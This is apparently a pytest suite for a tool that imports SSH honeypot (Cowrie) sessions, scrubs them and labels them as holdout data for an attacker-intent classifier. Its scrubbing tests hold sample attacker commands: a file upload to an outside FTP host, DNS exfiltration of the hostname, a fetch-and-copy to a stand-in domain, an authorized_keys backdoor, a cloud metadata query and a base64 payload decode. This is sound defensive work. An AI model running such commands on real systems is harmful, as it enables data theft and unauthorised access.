"""The capture importer: sensor events in, labelled holdout transcripts out.

Run with:  pytest ai-brain/content-generator/tests/test_captures.py -v
"""
from __future__ import annotations

import gzip
import ipaddress
import json
import re
import sys
from collections import Counter
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from ml.intent_classification import captures  # noqa: E402
from ml.intent_classification.eval_transcripts import load_captured  # noqa: E402
from ml.intent_classification.evaluation import iter_windows  # noqa: E402
from ml.intent_classification.rules import detect_intent_by_rules, is_external_host  # noqa: E402

#: A documentation address: outside the estate, and nobody's.
ORIGIN = "203.0.113.50"
DOCUMENTATION = [ipaddress.ip_network(n) for n in ("192.0.2.0/24", "198.51.100.0/24", "203.0.113.0/24")]


def sensor_event(session, command, second, origin=ORIGIN, **extra):
    """A command as the sensor logs it (Cowrie format)."""
    return {
        "eventid": "cowrie.command.input", "session": session, "input": command, "sensor": "node-01",
        "src_ip": origin, "timestamp": f"2026-10-03T09:00:{second:02d}.000000Z", **extra,
    }


def hub_event(session, command, second):
    """The same command as the hub stores it in Elasticsearch."""
    return {
        "event_type": "command_exec", "session_id": session, "command": command, "sensor_id": "node-01",
        "src_ip": ORIGIN, "timestamp": f"2026-10-03T09:00:{second:02d}.000000Z",
    }


def ndjson(path, events, extra_lines=()):
    path.write_text("\n".join([json.dumps(e) for e in events] + list(extra_lines)) + "\n", encoding="utf-8")
    return path


def extract(*paths, **options):
    stats = Counter()
    return captures.extract(captures.read_events(paths, stats), stats, **options), stats


def commands(session):
    return [step["command"] for step in session["steps"]]


def candidate(name, typed, labels=None):
    labels = labels or [None] * len(typed)
    return {
        "name": name, "tempo": "bot", "source": "a test", "training_overlap": 0,
        "steps": [
            {"label": label, "command": command, "timestamp": f"2026-10-03T09:00:{n:02d}.000000Z"}
            for n, (command, label) in enumerate(zip(typed, labels), 1)
        ],
    }


def candidates_file(tmp_path, sessions):
    path = tmp_path / "capture_candidates.json"
    captures._write(path, "a test", sessions)
    return path


def quiet(text):
    pass


# --------------------------------------------------------------------------
# reading and grouping
# --------------------------------------------------------------------------


def test_a_sensor_log_becomes_sessions_in_time_order(tmp_path):
    log = ndjson(tmp_path / "events.ndjson", [
        {"eventid": "cowrie.session.connect", "session": "a1", "src_ip": ORIGIN, "timestamp": "2026-10-03T09:00:00Z"},
        sensor_event("a1", "whoami", 3),
        sensor_event("b2", "ls -la", 2),
        sensor_event("a1", "uname -a", 1),  # logged late, typed first
        sensor_event("b2", "pwd", 4),
        {"eventid": "cowrie.session.closed", "session": "a1", "timestamp": "2026-10-03T09:00:05Z"},
    ], extra_lines=["not json"])
    sessions, stats = extract(log)
    assert [commands(s) for s in sessions] == [["uname -a", "whoami"], ["ls -la", "pwd"]]
    assert all(step["label"] is None for s in sessions for step in s["steps"])
    assert stats["unreadable lines"] == 1


@pytest.mark.parametrize("indent", [None, 2], ids=["compact", "pretty"])
def test_an_elasticsearch_export_reads_the_same(tmp_path, indent):
    response = {"took": 3, "hits": {"total": {"value": 2}, "hits": [
        {"_index": "cowrie-events", "_source": hub_event("c3", "uname -a", 1)},
        {"_index": "cowrie-events", "_source": hub_event("c3", "whoami", 2)},
    ]}}
    export = tmp_path / "es.json"
    export.write_text(json.dumps(response, indent=indent), encoding="utf-8")
    sessions, _ = extract(export)
    assert [commands(s) for s in sessions] == [["uname -a", "whoami"]]


def test_rotated_and_gzipped_logs_in_a_directory_are_found(tmp_path):
    logs = tmp_path / "logs"
    logs.mkdir()
    with gzip.open(logs / "cowrie.json.2026-10-03.gz", "wt", encoding="utf-8") as handle:
        handle.write("\n".join(json.dumps(sensor_event("d4", c, n)) for n, c in enumerate(["id", "w"], 1)))
    (logs / "notes.txt").write_text("not a log", encoding="utf-8")
    sessions, stats = extract(logs)
    assert stats["files"] == 1 and [commands(s) for s in sessions] == [["id", "w"]]


def test_a_published_dataset_of_sessions_keyed_by_id_reads_the_same(tmp_path):
    """The CyberLab honeynet dataset's layout: a JSON array with one session per
    line, keyed by its id, and each command only in Cowrie's "CMD: ..." message."""
    def event(session, command, second):
        return {"eventid": "cowrie.command.input", "session_id": session, "message": f"CMD: {command}",
                "sensor": "prod-ubuntu-ssh-1", "src_ip_identifier": "9f2c",
                "timestamp": f"2020-01-07T09:00:{second:02d}.000000Z"}

    connect = {"eventid": "cowrie.session.connect", "session_id": "n1", "timestamp": "2020-01-07T09:00:00.000000Z"}
    sessions = [{"n1": [connect, event("n1", "uname -a", 1), event("n1", "whoami", 2)]},
                {"n2": [event("n2", "ls -la", 3), event("n2", "pwd", 4)]}]
    path = tmp_path / "cyberlab_2020-01-07.json.gz"
    with gzip.open(path, "wt", encoding="utf-8") as handle:
        handle.write("[" + ",\n".join(json.dumps(s) for s in sessions) + "]\n")
    found, stats = extract(path, credit="CyberLab honeynet dataset, CC BY 4.0")
    assert [commands(s) for s in found] == [["uname -a", "whoami"], ["ls -la", "pwd"]]
    assert stats["unreadable lines"] == 0 and found[0]["source"].endswith("; CyberLab honeynet dataset, CC BY 4.0")


def test_one_bot_script_run_by_many_sessions_is_one_transcript(tmp_path):
    events = [sensor_event(f"bot{n}", c, k) for n in range(3) for k, c in enumerate(["uname -a", "nproc"], 1)]
    sessions, stats = extract(ndjson(tmp_path / "e.ndjson", events))
    assert len(sessions) == 1 and "3 sessions ran this script" in sessions[0]["source"]
    assert sessions[0]["sessions"] == 3


def test_runs_that_differ_only_in_names_and_numbers_are_one_script(tmp_path):
    """Bots vary a file name or a number every run; exact matching left a real
    day of traffic at 575 'distinct' sequences for nine scripts."""
    runs = [("a8f3k2x9", 5), ("q7m1z0p4", 30)]
    events = [sensor_event(f"r{n}", c, k) for n, (name, pause) in enumerate(runs)
              for k, c in enumerate([f"mkdir /tmp/{name}", f"sleep {pause}", "uname -a"], 1)]
    log = ndjson(tmp_path / "e.ndjson", events)
    merged, stats = extract(log)
    assert len(merged) == 1 and merged[0]["sessions"] == 2 and stats["exact sequences"] == 2
    apart, _ = extract(log, merge_similar=False)
    assert len(apart) == 2
    already, stats = extract(log, known={("mkdir /tmp/zz11yy22", "sleep 9", "uname -a")})
    assert already == [] and stats["already labelled"] == 1


def test_the_same_event_read_twice_counts_once(tmp_path):
    events = [sensor_event("e5", "id", 1), sensor_event("e5", "w", 2)]
    log = ndjson(tmp_path / "events.ndjson", events)
    spooled = ndjson(tmp_path / "spooled.ndjson", events[1:])  # the sidecar's copy of one of them
    sessions, stats = extract(log, spooled)
    assert [commands(s) for s in sessions] == [["id", "w"]] and stats["repeated events"] == 1


def test_short_sessions_and_logins_from_inside_are_skipped(tmp_path):
    log = ndjson(tmp_path / "e.ndjson", [
        sensor_event("f6", "id", 1),  # one command leaves nothing to classify
        sensor_event("g7", "id", 1, origin="172.18.0.1"), sensor_event("g7", "w", 2, origin="172.18.0.1"),
    ])
    sessions, stats = extract(log)
    assert sessions == [] and stats["too short"] == 1 and stats["from inside"] == 1
    sessions, _ = extract(log, include_private=True)  # behind NAT, everyone is inside
    assert [commands(s) for s in sessions] == [["id", "w"]]


def test_a_pivot_session_belongs_to_the_attacker_not_the_node_they_came_from(tmp_path):
    hop = [sensor_event("h8", c, n, origin="10.60.0.5", attacker=ORIGIN) for n, c in enumerate(["id", "w"], 1)]
    sessions, _ = extract(ndjson(tmp_path / "e.ndjson", hop))
    assert len(sessions) == 1


def test_a_protocol_filter_reads_it_from_whichever_event_carries_it(tmp_path):
    """In Cowrie only the connect event names the protocol. This honeypot speaks
    SSH; a public dataset's telnet IoT bots would otherwise fill the sample."""
    def connect(session, protocol):
        return {"eventid": "cowrie.session.connect", "session": session, "protocol": protocol,
                "src_ip": ORIGIN, "timestamp": "2026-10-03T09:00:00.000000Z"}

    events = [connect("t1", "telnet"), sensor_event("t1", "enable", 1), sensor_event("t1", "sh", 2),
              connect("s1", "ssh"), sensor_event("s1", "uname -a", 3), sensor_event("s1", "w", 4)]
    sessions, stats = extract(ndjson(tmp_path / "e.ndjson", events), protocol="ssh")
    assert [commands(s) for s in sessions] == [["uname -a", "w"]] and stats["other protocol"] == 1


def test_sequences_already_labelled_are_left_out(tmp_path):
    log = ndjson(tmp_path / "e.ndjson", [sensor_event("i9", "id", 1), sensor_event("i9", "w", 2)])
    sessions, stats = extract(log, known={("id", "w")})
    assert sessions == [] and stats["already labelled"] == 1


def test_a_limit_takes_the_same_sample_every_time(tmp_path):
    openers = ["id", "w", "uptime", "pwd", "ls", "df -h", "free -m", "nproc", "date", "who"]
    events = [sensor_event(f"s{n}", c, k) for n, opener in enumerate(openers) for k, c in enumerate([opener, "hostname"], 1)]
    log = ndjson(tmp_path / "e.ndjson", events)
    first, _ = extract(log, limit=4, seed=1)
    again, _ = extract(log, limit=4, seed=1)
    assert len(first) == 4 and first == again


def test_tempo_and_training_overlap_come_from_the_session(tmp_path):
    fast = [sensor_event("k1", c, n) for n, c in enumerate(["id", "w", "uptime"], 1)]
    slow = [dict(sensor_event("k2", c, 0), timestamp=f"2026-10-03T09:{m:02d}:30.000000Z")
            for m, c in enumerate(["ls", "pwd", "df -h"], 1)]
    sessions, stats = extract(ndjson(tmp_path / "e.ndjson", fast + slow), training={("id", "w")})
    assert [s["tempo"] for s in sessions] == ["bot", "human"]
    assert [s["training_overlap"] for s in sessions] == [1, 0]


# --------------------------------------------------------------------------
# scrubbing
# --------------------------------------------------------------------------


def test_public_addresses_become_documentation_addresses_and_the_estate_stays():
    scrubbed = captures.scrub("ping -c1 8.8.8.8; ping -c1 10.60.0.5; curl -s http://169.254.169.254/latest/")
    addresses = re.findall(r"\d+\.\d+\.\d+\.\d+", scrubbed)
    assert "8.8.8.8" not in addresses and {"10.60.0.5", "169.254.169.254"} <= set(addresses)
    replacement = addresses[0]
    assert any(ipaddress.ip_address(replacement) in net for net in DOCUMENTATION) and is_external_host(replacement)
    assert captures.scrub("ping -c1 8.8.8.8") == captures.scrub("ping -c1 8.8.8.8")


def test_public_domains_are_replaced_but_file_names_are_not():
    scrubbed = captures.scrub("wget -q http://cdn.mirror-host.com/tool.tgz && scp tool.tgz u@files.mirror-host.com:/in && cat run.sh")
    assert "mirror-host.com" not in scrubbed
    assert re.search(r"http://cdn\.host\d+\.example\.net/tool\.tgz", scrubbed)
    assert re.search(r"u@files\.host\d+\.example\.net:/in", scrubbed) and scrubbed.endswith("cat run.sh")


def test_keys_and_long_payloads_are_cut_short():
    key = "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGxvbmdrZXltYXRlcmlhbGhlcmU op@box' >> ~/.ssh/authorized_keys"
    assert "ssh-ed25519 AAAA_REDACTED op@box" in captures.scrub(key)
    assert "_TRUNCATED_160" in captures.scrub("echo " + "QUJD" * 40 + " | base64 -d > /tmp/x")


@pytest.mark.parametrize("command", [
    "ssh -i /tmp/k deploy@10.60.0.31",
    "curl -s -T /tmp/report.csv ftp://8.8.8.8/in/",
    "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGxvbmdrZXltYXRlcmlhbGhlcmU op@box' >> ~/.ssh/authorized_keys",
    "dig +short $(hostname).cdn.mirror-host.com",
])
def test_a_scrubbed_command_classifies_as_the_captured_one_did(command):
    before = detect_intent_by_rules({"commands": [command]})
    after = detect_intent_by_rules({"commands": [captures.scrub(command)]})
    assert (before and before.intent) == (after and after.intent)


# --------------------------------------------------------------------------
# labelling and adding
# --------------------------------------------------------------------------


def test_labelling_asks_for_each_step_and_saves_as_it_goes(tmp_path):
    path = candidates_file(tmp_path, [candidate("cap-a", ["uname -a", "cd /tmp"]), candidate("cap-b", ["id", "w"])])
    answers = iter(["r", "maybe", "u", "R", "n", "d"])
    captures.label(path, ask=lambda prompt: next(answers), say=quiet)
    first, second = captures._read(path)
    assert [step["label"] for step in first["steps"]] == ["R", "N"] and second.get("drop") is True


def test_a_command_seen_before_offers_the_labellers_own_answer(tmp_path):
    path = candidates_file(tmp_path, [candidate("cap-a", ["uname -a", "free -m"]),
                                      candidate("cap-b", ["free -m", "uname -a"])])
    prompts, answers = [], iter(["R", "R", "", ""])
    captures.label(path, ask=lambda prompt: prompts.append(prompt) or next(answers), say=quiet)
    assert [step["label"] for s in captures._read(path) for step in s["steps"]] == ["R", "R", "R", "R"]
    assert "(Enter: R)" not in prompts[0] and "(Enter: R)" in prompts[2]


def test_quitting_labelling_keeps_what_was_done(tmp_path):
    path = candidates_file(tmp_path, [candidate("cap-a", ["uname -a", "id"])])
    answers = iter(["R", "q"])
    captures.label(path, ask=lambda prompt: next(answers), say=quiet)
    assert [step["label"] for step in captures._read(path)[0]["steps"]] == ["R", None]


def test_adding_is_all_or_nothing_and_never_twice(tmp_path):
    into = tmp_path / "captured_sessions.json"
    unfinished = [candidate("cap-a", ["uname -a", "id"], ["R", "R"]), candidate("cap-b", ["ls", "pwd"])]
    assert captures.add(candidates_file(tmp_path, unfinished), into=into, say=quiet) == 1
    assert not into.exists()

    finished = [candidate("cap-a", ["uname -a", "id"], ["R", "R"]), candidate("cap-b", ["ls", "pwd"], ["r", "n"])]
    path = candidates_file(tmp_path, finished)
    assert captures.add(path, into=into, say=quiet) == 0
    transcripts = load_captured(into)
    assert [t.name for t in transcripts] == ["cap-a", "cap-b"] and {t.split for t in transcripts} == {"holdout"}
    assert captures.add(path, into=into, say=quiet) == 0 and len(load_captured(into)) == 2


def test_a_session_with_no_stage_is_refused(tmp_path):
    path = candidates_file(tmp_path, [candidate("cap-a", ["cd /tmp", "ls"], ["N", "N"])])
    assert captures.add(path, into=tmp_path / "captured.json", say=quiet) == 1


def test_captured_sessions_are_scored_with_their_own_timestamps_and_traffic(tmp_path):
    into = tmp_path / "captured_sessions.json"
    script = dict(candidate("cap-a", ["uname -a", "id", "w"], ["R", "N", "R"]), sessions=5)
    captures.add(candidates_file(tmp_path, [script]), into=into, say=quiet)
    windows = iter_windows(load_captured(into))
    assert windows[0].activity["event_timestamps"] == ["2026-10-03T09:00:01.000000Z", "2026-10-03T09:00:02.000000Z"]
    assert [w.label for w in windows] == ["reconnaissance", "reconnaissance"]
    assert {w.weight for w in windows} == {5}


def test_a_score_can_be_weighted_by_the_traffic_each_script_stands_for():
    from ml.intent_classification.evaluation import Report

    report = Report("x", labels=["a", "a", "b"], predictions=["a", "b", "b"], informative=[True] * 3, weights=[1, 1, 8])
    assert report.accuracy == pytest.approx(2 / 3) and report.weighted_accuracy == pytest.approx(9 / 10)
    assert report.summary()["traffic_weighted_accuracy"] == 0.9
    unweighted = Report("y", labels=["a"], predictions=["a"], informative=[True], weights=[1])
    assert unweighted.weighted_accuracy is None and "traffic_weighted_accuracy" not in unweighted.summary()


@pytest.mark.parametrize("change, message", [
    ({"split": "holdot"}, "split must be"),
    ({"steps": [{"label": "Q", "command": "id", "timestamp": "t1"}, {"label": "R", "command": "w", "timestamp": "t2"}]},
     "label outside"),
    ({"steps": [{"label": "N", "command": "id", "timestamp": "t1"}, {"label": "N", "command": "w", "timestamp": "t2"}]},
     "every step"),
])
def test_a_malformed_captured_file_fails_loudly(tmp_path, change, message):
    session = {"name": "cap-x", "split": "holdout", "tempo": "bot", "source": "a test",
               "steps": [{"label": "R", "command": "id", "timestamp": "t1"}, {"label": "N", "command": "w", "timestamp": "t2"}]}
    path = tmp_path / "captured.json"
    path.write_text(json.dumps({"sessions": [{**session, **change}]}), encoding="utf-8")
    with pytest.raises(ValueError, match=message):
        load_captured(path)


def test_the_command_line_extracts_and_will_not_overwrite_labels(tmp_path, capsys):
    log = ndjson(tmp_path / "events.ndjson", [sensor_event("m1", c, n) for n, c in enumerate(["uname -a", "nproc", "w"], 1)])
    out = tmp_path / "candidates.json"
    assert captures.main(["extract", str(log), "--out", str(out)]) == 0
    assert len(captures._read(out)) == 1 and "wrote 1 session(s)" in capsys.readouterr().out

    sessions = captures._read(out)
    sessions[0]["steps"][0]["label"] = "R"
    captures._write(out, "a test", sessions)
    assert captures.main(["extract", str(log), "--out", str(out)]) == 1
